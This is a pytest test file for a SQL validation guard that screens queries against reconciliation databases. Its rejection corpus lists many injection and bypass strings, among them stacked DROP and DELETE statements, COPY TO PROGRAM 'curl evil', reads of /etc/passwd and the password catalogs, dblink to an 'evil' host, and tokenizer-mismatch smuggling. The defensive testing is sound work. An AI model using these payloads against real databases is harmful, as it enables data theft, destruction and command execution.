"""Tests for sql_guard.validate_select (negative attack corpus, positive analytic corpus, live DB run)."""

from __future__ import annotations

import re

import psycopg
import pytest

from prism.mcp.sql_guard import SqlGuardError, validate_select

MAX_ROWS = 50

CASHRECON = {
    "public.cash_accounts",  # masking VIEW (allowed); private.cash_accounts base table is NOT
    "public.statements",
    "public.statement_entries",
    "public.ledger_entries",
    "public.match_rules",
    "public.match_groups",
    "public.match_items",
    "public.breaks",
    "public.break_actions",
}
ASSETRECON = {
    "public.custodians",
    "public.portfolios",
    "public.internal_positions",
    "public.custodian_positions",
    "public.internal_transactions",
    "public.custodian_transactions",
    "public.recon_runs",
    "public.recon_exceptions",
    "public.nav_checks",
}
FEEDHUB = {"public.sources", "public.feeds", "public.feed_deliveries", "public.support_tickets"}
ALLOWED = frozenset(CASHRECON | ASSETRECON | FEEDHUB)


# --------------------------------------------------------------------------------------
# NEGATIVE corpus: every entry must raise SqlGuardError.
# --------------------------------------------------------------------------------------
NEGATIVE = [
    # stacked statements / comment smuggling
    "SELECT 1; SELECT 2",
    "SELECT * FROM breaks; DROP TABLE breaks",
    "SELECT 1 /* harmless */; DELETE FROM breaks",
    "SELECT 1 -- comment\n; UPDATE breaks SET status = 'closed'",
    "SELECT /* /* nested */ */ 1; SELECT pg_sleep(10)",
    "SELECT 1 /* ; */ ; TRUNCATE breaks",
    # non-SELECT statements
    "INSERT INTO breaks (break_id) VALUES ('x')",
    "UPDATE breaks SET status = 'closed'",
    "DELETE FROM breaks",
    "MERGE INTO breaks b USING breaks s ON b.break_id = s.break_id WHEN MATCHED THEN DELETE",
    "DROP TABLE breaks",
    "CREATE TABLE evil AS SELECT * FROM breaks",
    "ALTER TABLE breaks ADD COLUMN x int",
    "TRUNCATE breaks",
    "COPY breaks TO '/tmp/x.csv'",
    "COPY (SELECT * FROM breaks) TO PROGRAM 'curl evil'",
    "SET search_path = private",
    "SET ROLE postgres",
    "RESET ALL",
    "SHOW search_path",
    "EXPLAIN ANALYZE SELECT * FROM breaks",
    "DO $$ BEGIN PERFORM pg_sleep(10); END $$",
    "CALL some_proc()",
    "LISTEN chan",
    "PREPARE p AS SELECT 1",
    "EXECUTE p",
    "VACUUM breaks",
    "GRANT SELECT ON breaks TO public",
    "BEGIN",
    "TABLE breaks",
    "VALUES (1), (2)",
    # SELECT with side effects / locks
    "SELECT * INTO evil FROM breaks",
    "SELECT * FROM breaks FOR UPDATE",
    "SELECT * FROM breaks FOR SHARE",
    "SELECT * FROM (SELECT * FROM breaks FOR NO KEY UPDATE) s",
    "WITH d AS (DELETE FROM breaks RETURNING *) SELECT * FROM d",
    "WITH u AS (UPDATE breaks SET owner = 'x' RETURNING *) SELECT count(*) FROM u",
    "WITH i AS (INSERT INTO break_actions (action_id) VALUES ('x') RETURNING *) SELECT * FROM i",
    # table allow-list / catalogs
    "SELECT * FROM private.cash_accounts",
    "SELECT * FROM PRIVATE.CASH_ACCOUNTS",
    'SELECT * FROM "private"."cash_accounts"',
    "SELECT b.* FROM breaks b JOIN private.cash_accounts c ON c.account_id = b.account_id",
    "SELECT * FROM breaks WHERE account_id IN (SELECT account_id FROM private.cash_accounts)",
    "SELECT 1 WHERE EXISTS (SELECT 1 FROM private.cash_accounts)",
    "SELECT (SELECT max(nostro_no) FROM private.cash_accounts) AS x",
    "SELECT * FROM breaks b, LATERAL (SELECT * FROM private.cash_accounts c WHERE c.account_id = b.account_id) x",
    "WITH c AS (SELECT * FROM private.cash_accounts) SELECT * FROM c",
    "SELECT * FROM breaks UNION ALL SELECT * FROM private.cash_accounts",
    "SELECT * FROM pg_catalog.pg_class",
    "SELECT * FROM pg_class",
    "SELECT * FROM PG_SHADOW",
    "SELECT usename, passwd FROM pg_user",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM pg_toast.pg_toast_1234",
    "SELECT * FROM breaks WHERE status = ANY(ARRAY(SELECT rolname FROM pg_roles))",
    "SELECT * FROM secret_table",
    "SELECT * FROM otherdb.public.breaks",
    # CTE-name shadowing: `secret` is a CTE only inside the derived table
    "SELECT * FROM (WITH secret AS (SELECT 1) SELECT * FROM secret) a, secret",
    # functions
    "SELECT pg_sleep(10)",
    "SELECT PG_SLEEP(10)",
    'SELECT "PG_SLEEP"(10)',
    'SELECT "pg_sleep"(10)',
    "SELECT pg_catalog.pg_sleep(10)",
    "SELECT pg_sleep_for('10 seconds')",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM pg_read_file('/etc/passwd')",
    "SELECT * FROM pg_ls_dir('.')",
    "SELECT * FROM ROWS FROM (pg_ls_dir('.')) AS x",
    "SELECT pg_read_binary_file('/etc/passwd')",
    "SELECT pg_terminate_backend(1234)",
    "SELECT pg_cancel_backend(1234)",
    "SELECT set_config('search_path', 'private', false)",
    "SELECT current_setting('data_directory')",
    "SELECT CURRENT_SETTING('is_superuser')",
    "SELECT dblink('host=evil', 'select 1')",
    "SELECT * FROM dblink_exec('host=evil', 'drop table x')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1234, '/tmp/x')",
    "SELECT query_to_xml('select * from private.cash_accounts', true, true, '')",
    "SELECT table_to_xml('private.cash_accounts', true, true, '')",
    "SELECT txid_current()",
    "SELECT nextval('some_seq')",
    "SELECT setval('some_seq', 1)",
    "SELECT to_regclass('private.cash_accounts')",
    "SELECT has_table_privilege('private.cash_accounts', 'select')",
    "SELECT version()",
    "SELECT private.some_fn()",
    "SELECT prism_sec.has_scope('pii:read')",
    "SELECT count(*) FROM breaks WHERE pg_sleep(1) IS NOT NULL",
    "SELECT * FROM breaks ORDER BY (SELECT pg_sleep(5))",
    # reg* casts
    "SELECT 'private.cash_accounts'::regclass",
    "SELECT 'private.cash_accounts'::regclass::oid",
    "SELECT CAST('pg_sleep(float8)' AS regprocedure)",
    "SELECT 'pg_sleep'::regproc",
    "SELECT 'x'::regnamespace",
    'SELECT 1::"regclass"',
    "SELECT CAST(1 AS pg_catalog.regclass)",
    # unicode / escape tricks
    'SELECT U&"\\0070g_sleep"(1)',
    "SELECT u&'\\0070' AS x",
    "SELECT ｐｇ_sleep(1)",  # fullwidth -> NFKC folds to pg_sleep
    "SELECT pg_slеep(1)",  # Cyrillic 'е'
    "SELECT \x00 1",
    # dollar quoting cannot hide a second statement
    "SELECT $$x$$; DROP TABLE breaks",
    "SELECT $tag$ ; $tag$; DELETE FROM breaks",
    # functions that execute query text / reg* function-style casts / lo I/O without lo_ prefix
    "SELECT * FROM ts_stat('SELECT to_tsvector(nostro_no) FROM private.cash_accounts')",
    "SELECT ts_rewrite('a'::tsquery, 'SELECT ''a''::tsquery, ''b''::tsquery FROM private.cash_accounts')",
    "SELECT regclass('private.cash_accounts')",
    "SELECT regprocedure('pg_sleep(float8)')",
    "SELECT loread(0, 10)",
    "SELECT lowrite(0, 'x')",
    # backslash / E-string tokenizer mismatch: sqlglot re-emits E'<bs><bs>' as e'<bs>',
    # which is an unterminated string for PG -> later literal contents become live SQL
    # (the first entry below was accepted before the backslash rule and leaked private.cash_accounts)
    r"SELECT E'\\' AS a, ' AS b, (SELECT count(*) FROM private.cash_accounts) AS leak, ' AS c",
    r"SELECT E'\\', ' , (SELECT count(*) FROM breaks) AS x --'",
    r"SELECT E'it\'s' AS x",
    r"SELECT 'a\' AS x",
    r"SELECT 'x\' ; SELECT 1 --' AS y",
    # date_bin origin literal re-emitted unquoted by sqlglot (opaque Var) -> live SQL
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN PG_SLEEP(3) IS NULL THEN CURRENT_TIMESTAMP ELSE CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN (SELECT COUNT(*) FROM pg_catalog.pg_roles) >= 0 THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN (SELECT COUNT(*) FROM information_schema.columns) >= 0 THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN (SELECT COUNT(*) FROM private.cash_accounts) >= 0 THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN (SELECT COUNT(*) FROM prism_sec.hmac_key) >= 0 THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN pg_read_file(''/etc/passwd'') IS NULL THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), 'CASE WHEN (SELECT COUNT(*) FROM pg_catalog.pg_class) > 0 THEN CURRENT_TIMESTAMP END') AS x",
    "SELECT date_bin('15 minutes', now(), '2001-01-01'); SELECT 1",
    "SELECT date_bin('15 minutes', now(), TIMESTAMP '2001-01-01')",
    # identity / session probes (dedicated sqlglot nodes, bare keywords, functions)
    "SELECT current_user",
    "SELECT session_user",
    "SELECT system_user",
    "SELECT current_role",
    "SELECT current_database()",
    "SELECT current_catalog",
    "SELECT current_schema",
    "SELECT current_schema()",
    "SELECT current_schemas(true)",
    "SELECT current_query()",
    "SELECT inet_client_port()",
    # date_part first arg re-emitted unquoted; schema-qualified operators; numeric-token differentials
    "SELECT date_part('CASE WHEN PG_SLEEP(3) IS NULL THEN 1 END', now())",
    "SELECT date_part('epoch FROM (SELECT pg_sleep(3)))--', now())",
    "SELECT 1 OPERATOR(pg_catalog.+) 2",
    "SELECT 1 OPERATOR(private.+) 2",
    "SELECT 0o17",
    "SELECT 1_000_000",
    "SELECT 0x1F",
    "SELECT 0b101",
    "SELECT user",
    "SELECT getpgusername()",
    "SELECT OPERATOR(pg_catalog.-) 1",
    "SELECT g FROM generate_series(1,3) g ORDER BY g USING OPERATOR(pg_catalog.<)",
    'SELECT "current_user"()',
    # E-strings and backslash-quote (string boundary ambiguity)
    r"SELECT e'x' AS a",
    r"SELECT 1 WHERE 'a\'' = 'b'",
    # size cap
    "SELECT " + ", ".join(["1"] * 2500),
    # garbage / empty
    "",
    "   ",
    ";",
    "SELEC 1",
]


@pytest.mark.parametrize("sql", NEGATIVE)
def test_negative_corpus_rejected(sql: str) -> None:
    with pytest.raises(SqlGuardError):
        validate_select(sql, allowed_tables=ALLOWED, max_rows=MAX_ROWS)


def test_negative_corpus_size() -> None:
    assert len(NEGATIVE) >= 40


def test_error_is_value_error() -> None:
    assert issubclass(SqlGuardError, ValueError)
    with pytest.raises(ValueError, match="table not allowed: private.cash_accounts"):
        validate_select("SELECT * FROM private.cash_accounts", allowed_tables=ALLOWED)


# --------------------------------------------------------------------------------------
# POSITIVE corpus: (database, sql). Every entry must be accepted and must run.
# --------------------------------------------------------------------------------------
POSITIVE: list[tuple[str, str]] = [
    # cashrecon
    ("cashrecon", "SELECT account_id, legal_entity_id, nostro_no, ccy FROM cash_accounts"),
    ("cashrecon", "SELECT c.ccy, count(*) FROM public.cash_accounts c GROUP BY c.ccy"),
    (
        "cashrecon",
        "SELECT status, ccy, count(*) AS n, sum(amount) AS total, "
        "count(*) FILTER (WHERE age_days > 30) AS aged_30 FROM breaks GROUP BY status, ccy ORDER BY total DESC",
    ),
    (
        "cashrecon",
        "SELECT b.break_id, b.amount, a.action, a.ts FROM breaks b "
        "LEFT JOIN break_actions a ON a.break_id = b.break_id ORDER BY a.ts DESC NULLS LAST",
    ),
    (
        "cashrecon",
        "WITH open_breaks AS (SELECT * FROM breaks WHERE status = 'open'), "
        "by_owner AS (SELECT coalesce(owner, 'unassigned') AS owner, count(*) AS n, avg(age_days) AS avg_age "
        "FROM open_breaks GROUP BY 1) SELECT * FROM by_owner ORDER BY n DESC",
    ),
    (
        "cashrecon",
        "SELECT break_id, region, amount, rank() OVER (PARTITION BY region ORDER BY amount DESC) AS rnk, "
        "sum(amount) OVER (PARTITION BY region) AS region_total FROM breaks",
    ),
    (
        "cashrecon",
        "SELECT date_trunc('month', value_date) AS month, dc, sum(amount) FROM statement_entries "
        "GROUP BY 1, 2 ORDER BY 1",
    ),
    (
        "cashrecon",
        "SELECT entry_id, booking_date, booking_date + INTERVAL '5 days' AS due, "
        "current_date - booking_date AS age FROM ledger_entries WHERE booking_date >= current_date - 365",
    ),
    (
        "cashrecon",
        "SELECT break_id, CASE WHEN age_days <= 7 THEN '0-7' WHEN age_days <= 30 THEN '8-30' ELSE '30+' END AS bucket "
        "FROM breaks",
    ),
    (
        "cashrecon",
        "SELECT 'statement' AS side, entry_id, amount FROM statement_entries "
        "UNION ALL SELECT 'ledger', entry_id, amount FROM ledger_entries ORDER BY amount DESC LIMIT 1000",
    ),
    (
        "cashrecon",
        "SELECT r.name, count(g.match_id) FROM match_rules r LEFT JOIN match_groups g ON g.rule_id = r.rule_id "
        "GROUP BY r.name HAVING count(g.match_id) >= 0",
    ),
    (
        "cashrecon",
        "SELECT * FROM breaks b WHERE b.account_id IN (SELECT account_id FROM cash_accounts WHERE ccy = 'USD')",
    ),
    (
        "cashrecon",
        "SELECT b.break_id, x.last_ts FROM breaks b, LATERAL (SELECT max(a.ts) AS last_ts FROM break_actions a "
        "WHERE a.break_id = b.break_id) x",
    ),
    ("cashrecon", "SELECT * FROM breaks TABLESAMPLE SYSTEM (50)"),
    ("cashrecon", "SELECT * FROM breaks WHERE status = ANY(ARRAY(SELECT DISTINCT status FROM breaks))"),
    ("cashrecon", "SELECT g AS n FROM generate_series(1, 1000) AS g"),
    ("cashrecon", "SELECT generate_series(1, 5) AS n"),
    ("cashrecon", "SELECT u.x FROM unnest(ARRAY['a', 'b', 'c']) AS u(x)"),
    ("cashrecon", "SELECT * FROM (VALUES ('open', 1), ('closed', 2)) AS v(status, ord)"),
    ("cashrecon", "SELECT 'a;b' AS semi, $$ ; DROP TABLE breaks; $$ AS dollar, 1 AS one"),
    ("cashrecon", "SELECT 1 AS x /* trailing comment ; */ -- line comment"),
    ("cashrecon", "SELECT break_id FROM breaks;"),
    (
        "cashrecon",
        "SELECT s.stmt_id, s.closing_bal - s.opening_bal AS movement, "
        "(SELECT sum(CASE WHEN e.dc = 'C' THEN e.amount ELSE -e.amount END) FROM statement_entries e "
        "WHERE e.stmt_id = s.stmt_id) AS entries_net FROM statements s",
    ),
    (
        "cashrecon",
        "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 10) SELECT * FROM r",
    ),
    ("cashrecon", "SELECT a.account_id, b.account_id FROM breaks a JOIN cash_accounts b ON a.account_id = b.account_id"),
    # assetrecon
    (
        "assetrecon",
        "SELECT i.portfolio_id, i.security_id, i.qty AS internal_qty, c.qty AS custodian_qty, i.qty - c.qty AS diff "
        "FROM internal_positions i FULL OUTER JOIN custodian_positions c "
        "ON c.portfolio_id = i.portfolio_id AND c.security_id = i.security_id AND c.as_of = i.as_of",
    ),
    (
        "assetrecon",
        "SELECT p.fund_group, count(*) FILTER (WHERE e.status = 'open') AS open_exc, sum(abs(e.diff_mv)) AS abs_mv "
        "FROM recon_exceptions e JOIN portfolios p ON p.portfolio_id = e.portfolio_id GROUP BY p.fund_group",
    ),
    (
        "assetrecon",
        "SELECT portfolio_id, nav_date, diff_bps, avg(diff_bps) OVER (PARTITION BY portfolio_id ORDER BY nav_date "
        "ROWS BETWEEN 4 PRECEDING AND CURRENT ROW) AS ma5, lag(diff_bps) OVER (PARTITION BY portfolio_id "
        "ORDER BY nav_date) AS prev FROM nav_checks",
    ),
    (
        "assetrecon",
        "SELECT txn_id FROM internal_transactions EXCEPT SELECT internal_ref FROM custodian_transactions "
        "WHERE internal_ref IS NOT NULL",
    ),
    (
        "assetrecon",
        "SELECT portfolio_id FROM internal_positions INTERSECT SELECT portfolio_id FROM custodian_positions",
    ),
    (
        "assetrecon",
        "SELECT date_trunc('week', business_date) AS wk, recon_type, sum(matched) AS matched, "
        "sum(unmatched) AS unmatched, round(100.0 * sum(matched) / nullif(sum(matched) + sum(unmatched), 0), 2) AS pct "
        "FROM recon_runs GROUP BY 1, 2 ORDER BY 1",
    ),
    (
        "assetrecon",
        "SELECT c.name AS custodian, p.name AS portfolio, p.base_ccy FROM custodians c "
        "JOIN portfolios p ON p.custodian_id = c.custodian_id",
    ),
    ("assetrecon", "SELECT * FROM recon_exceptions WHERE sla_due < current_date AND status <> 'closed'"),
    # feedhub
    (
        "feedhub",
        "SELECT s.name, f.data_type, count(*) AS deliveries, "
        "count(*) FILTER (WHERE d.status <> 'received') AS problems, percentile_cont(0.95) WITHIN GROUP "
        "(ORDER BY d.latency_min) AS p95_latency FROM feed_deliveries d JOIN feeds f ON f.feed_id = d.feed_id "
        "JOIN sources s ON s.source_id = f.source_id GROUP BY s.name, f.data_type",
    ),
    (
        "feedhub",
        "SELECT category, status, count(*), avg(extract(epoch FROM (closed_at - opened_at)) / 3600) AS avg_hours "
        "FROM support_tickets GROUP BY ROLLUP (category, status)",
    ),
    (
        "feedhub",
        "SELECT feed_id, business_date, status, row_number() OVER (PARTITION BY feed_id ORDER BY business_date DESC) "
        "AS rn FROM feed_deliveries",
    ),
    (
        "feedhub",
        "SELECT * FROM feeds f WHERE NOT EXISTS (SELECT 1 FROM support_tickets t WHERE t.feed_id = f.feed_id)",
    ),
    ("cashrecon", r"SELECT regexp_replace(reference, '\s+', ' ', 'g') AS r FROM statement_entries"),
    ("cashrecon", r"SELECT count(*) FROM statement_entries WHERE reference ~ '\d+'"),
    ("cashrecon", r"SELECT count(*) FROM breaks WHERE owner LIKE '%\_%'"),
    ("feedhub", "SELECT extract(epoch FROM (closed_at - opened_at)) AS e, date_trunc('day', opened_at) AS d, 1000000 AS m, 0.5 AS h, 1e3 AS k FROM support_tickets"),
    ("cashrecon", "SELECT .5 AS a, 5. AS b, 1e3 AS c"),
]


def test_positive_corpus_size() -> None:
    assert len(POSITIVE) >= 20


@pytest.mark.parametrize(("db", "sql"), POSITIVE)
def test_positive_corpus_accepted(db: str, sql: str) -> None:
    out = validate_select(sql, allowed_tables=ALLOWED, max_rows=MAX_ROWS)
    assert out.startswith("SELECT * FROM (")
    assert out.endswith(f") AS _q LIMIT {MAX_ROWS}")
    assert "--" not in out and "/*" not in out  # comments never survive
    assert out != sql
    # Idempotent re-validation of the rewritten SQL
    validate_select(out, allowed_tables=ALLOWED, max_rows=MAX_ROWS)


def test_returns_regenerated_sql_not_input() -> None:
    out = validate_select(
        "select   1 /* ; drop table breaks */ -- x", allowed_tables=ALLOWED, max_rows=10
    )
    assert out == "SELECT * FROM (SELECT 1) AS _q LIMIT 10"
    out = validate_select("SELECT $$a'b$$ AS s", allowed_tables=ALLOWED, max_rows=10)
    assert "$$" not in out and "'a''b'" in out


def test_limit_wrapping_keeps_inner_limit() -> None:
    out = validate_select("SELECT * FROM breaks LIMIT 100000", allowed_tables=ALLOWED, max_rows=500)
    assert out == "SELECT * FROM (SELECT * FROM breaks LIMIT 100000) AS _q LIMIT 500"


def test_masking_view_allowed_base_table_rejected() -> None:
    validate_select("SELECT * FROM public.cash_accounts", allowed_tables=ALLOWED)
    validate_select("SELECT * FROM cash_accounts", allowed_tables=ALLOWED)
    with pytest.raises(SqlGuardError):
        validate_select("SELECT * FROM private.cash_accounts", allowed_tables=ALLOWED)


def test_allowlist_is_enforced_per_call() -> None:
    with pytest.raises(SqlGuardError, match="table not allowed: public.feeds"):
        validate_select("SELECT * FROM feeds", allowed_tables=frozenset(CASHRECON))


# --------------------------------------------------------------------------------------
# Live execution against the seeded test DBs (read-only transaction, 5 s timeout).
# --------------------------------------------------------------------------------------
@pytest.fixture(scope="module")
def conns(seeded):
    cs = {db: psycopg.connect(seeded.dsn(db, admin=True)) for db in ("cashrecon", "assetrecon", "feedhub")}
    yield cs
    for c in cs.values():
        c.close()


@pytest.mark.parametrize(("db", "sql"), POSITIVE)
def test_positive_corpus_executes(conns, db: str, sql: str) -> None:
    rewritten = validate_select(sql, allowed_tables=ALLOWED, max_rows=MAX_ROWS)
    conn = conns[db]
    try:
        with conn.cursor() as cur:
            cur.execute("SET TRANSACTION READ ONLY")
            cur.execute("SET LOCAL statement_timeout = '5s'")
            cur.execute(rewritten)
            rows = cur.fetchall()
            assert cur.description is not None
    finally:
        conn.rollback()
    assert len(rows) <= MAX_ROWS


def test_regexp_functions_still_allowed() -> None:
    validate_select("SELECT regexp_replace(reference, '[0-9]+', '#') FROM statement_entries", allowed_tables=ALLOWED)


def test_psycopg_simple_protocol_runs_stacked_statements(conns) -> None:
    """Documents WHY the guard must reject stacked statements: psycopg 3 execute() without
    params uses the simple-query protocol and happily runs 'SELECT 1; SELECT 2'.
    prepare=True (extended protocol) refuses multiple commands - use it in the executor."""
    conn = conns["cashrecon"]
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT 1; SELECT 2")  # accepted by the server
            assert cur.fetchall() == [(1,)]
        conn.rollback()
        with conn.cursor() as cur, pytest.raises(psycopg.errors.SyntaxError):
            cur.execute("SELECT 1; SELECT 2", prepare=True)
    finally:
        conn.rollback()


def test_limit_actually_caps_rows(conns) -> None:
    rewritten = validate_select("SELECT g FROM generate_series(1, 100000) AS g", allowed_tables=ALLOWED, max_rows=7)
    conn = conns["cashrecon"]
    try:
        with conn.cursor() as cur:
            cur.execute("SET TRANSACTION READ ONLY")
            cur.execute("SET LOCAL statement_timeout = '5s'")
            cur.execute(rewritten)
            rows = cur.fetchall()
    finally:
        conn.rollback()
    assert len(rows) == 7


def test_seeded_tables_have_rows(conns) -> None:
    """Sanity: the executed corpus is not vacuous (base tables are seeded)."""
    counts = {}
    for db, table in (("cashrecon", "breaks"), ("assetrecon", "nav_checks"), ("feedhub", "feed_deliveries")):
        with conns[db].cursor() as cur:
            cur.execute(f"SELECT count(*) FROM {table}")
            counts[table] = cur.fetchone()[0]
        conns[db].rollback()
    assert all(n > 0 for n in counts.values()), counts


@pytest.mark.parametrize("sql", [
    "SELECT * FROM breaks; SELECT 1",          # stacked
    r"SELECT 'a\' AS x",                         # backslash
    "SELECT set_config('app.ctx', '', false)",  # context tampering
    "SELECT * FROM private.cash_accounts",      # base table behind the masking view
])
def test_review_focus_query_rejections(sql):
    with pytest.raises(SqlGuardError):
        validate_select(sql, allowed_tables=ALLOWED, max_rows=MAX_ROWS)


def test_guard_error_is_user_facing_and_a_value_error():
    from prism.mcp.results import UserFacingError

    assert issubclass(SqlGuardError, UserFacingError) and issubclass(SqlGuardError, ValueError)


def _chain(op: str) -> str:
    q = "SELECT 1 WHERE 1=1"
    while len(q) + len(f" {op} 1=1") <= 4000:
        q += f" {op} 1=1"
    return q


@pytest.mark.parametrize("op", ["AND", "OR"])
def test_long_boolean_chain_is_fast(op):
    import time

    q = _chain(op)
    assert len(q) > 3900
    t = time.perf_counter()
    try:
        validate_select(q, allowed_tables=ALLOWED, max_rows=MAX_ROWS)
    except SqlGuardError:
        pass
    assert time.perf_counter() - t < 1.0


@pytest.mark.parametrize("sql", [
    "SELECT " + "(" * 900 + "1" + ")" * 900,
    "SELECT " + "(SELECT " * 300 + "1" + ")" * 300,
    "SELECT " + "NOT " * 900 + "true",
    "SELECT " + "- " * 900 + "1",
    "SELECT * FROM " + "(SELECT * FROM " * 100 + "breaks" + ") AS t" * 100,
    "SELECT " + "abs(" * 500 + "1" + ")" * 500,
    "SELECT 1 " + "UNION SELECT 1 " * 300,
    "SELECT 1 x " + "FROM breaks " * 5 + "WHERE " + "(" * 400 + "1=1" + ")" * 400,
])
def test_deep_or_huge_input_raises_guard_error_not_recursion_error(sql):
    try:
        validate_select(sql, allowed_tables=ALLOWED, max_rows=MAX_ROWS)
    except SqlGuardError:
        pass


def test_deep_nesting_within_size_cap_is_guard_error():
    with pytest.raises(SqlGuardError):
        validate_select("SELECT " + "(SELECT " * 300 + "1" + ")" * 300, allowed_tables=ALLOWED)


def test_too_long_message():
    with pytest.raises(SqlGuardError, match="too long"):
        validate_select("SELECT 1 " + " " * 4000, allowed_tables=ALLOWED)


def test_reparsed_tree_is_policy_checked(monkeypatch):
    """Even if text round-trips, the re-parsed regenerated SQL is enforced again."""
    import prism.mcp.sql_guard as g

    calls = []
    real = g._enforce
    monkeypatch.setattr(g, "_enforce", lambda tree, allowed: (calls.append(1), real(tree, allowed))[1])
    validate_select("SELECT * FROM breaks", allowed_tables=ALLOWED)
    assert len(calls) == 2


_MALFORMED = [
    "SELECT FROM WHERE ((",
    "SELECT (1",
    "SELECT 1)",
    ")))",
    "SELECT * FROM breaks WHERE",
    "SELECT a FROM breaks b JOIN",
    "SELECT 1 +",
    "SELECT CAST(1 AS)",
    "SELECT * FROM breaks\n WHERE a = (1,",
    "@@@ ### $$$",
    "SELECT 'abc",
    'SELECT "unterminated',
    "SELECT $$abc",
]


@pytest.mark.parametrize("sql", _MALFORMED)
def test_parse_failures_have_clean_fixed_messages(sql):
    with pytest.raises(SqlGuardError) as e:
        validate_select(sql, allowed_tables=frozenset({"public.breaks"}))
    msg = str(e.value)
    assert re.match(r"^could not parse SQL( \(line \d+, column \d+\))?$", msg), msg
    for leak in ("\x1b", "Token", "TokenType", "<class", "sqlglot", "SENTINEL", "Expected", "\n"):
        assert leak not in msg, (leak, msg)


def test_parse_failure_reports_line_and_column():
    with pytest.raises(SqlGuardError, match=r"^could not parse SQL \(line 1, column 17\)$"):
        validate_select("SELECT FROM WHERE ((", allowed_tables=frozenset({"public.breaks"}))
    with pytest.raises(SqlGuardError, match=r"^could not parse SQL \(line 2, column 14\)$"):
        validate_select("SELECT * FROM breaks\n WHERE a = (1,", allowed_tables=frozenset({"public.breaks"}))


def test_echoed_names_are_bounded_and_have_no_control_characters():
    with pytest.raises(SqlGuardError) as e:
        validate_select("SELECT * FROM " + "x" * 300, allowed_tables=frozenset({"public.breaks"}))
    msg = str(e.value)
    assert msg.startswith("table not allowed: public.xxx") and len(msg) <= len("table not allowed: ") + 80
    with pytest.raises(SqlGuardError) as e:
        validate_select('SELECT * FROM "a\x1b[31mb"', allowed_tables=frozenset({"public.breaks"}))
    assert "\x1b" not in str(e.value) and str(e.value).startswith("table not allowed: public.a")
